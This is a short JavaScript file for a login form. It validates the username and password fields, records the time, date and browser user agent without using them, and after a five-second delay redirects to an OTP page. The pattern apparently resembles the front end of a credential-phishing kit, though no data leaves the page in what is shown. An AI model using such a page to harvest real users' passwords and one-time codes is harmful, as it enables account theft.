const form = document.getElementById("Form")
const userName = document.getElementById("username")
const passWord = document.getElementById("password")
const submit = document.getElementById("continue")
const time = getCurrentTime()
const date = getCurrentDate()
const browserInfo = getBrowserInfo()

// To get date and time
function getCurrentTime(){
    return new Date().toLocaleTimeString()
}

function getCurrentDate(){
    return new Date().toLocaleDateString()
}

// To get browser information
function getBrowserInfo() {
    return navigator.userAgent;
}

submit.addEventListener('click', ()=>{
    let isValid = true

    // Username input validation
    if (userName.value == "") {
        document.getElementById("userError").style.display = "block"
        isValid = false
    } else {
        document.getElementById("userError").style.display = "none"
    }

    // Password input validation
    if (passWord.value == "") {
        document.getElementById("passError").style.display = "block"
        isValid = false
    } else {
        document.getElementById("passError").style.display = "none"
    }

    if (isValid) {
        setTimeout(()=>{
            window.location.href = "otp.html"
        }, 5000)
    }else {
        if (userName.value.trim() == "") {
            document.getElementById("userError").style.display = "block"
        }
        if (passWord.value.trim() == "") {
            document.getElementById("passError").style.display = "block"
        }
    }
})

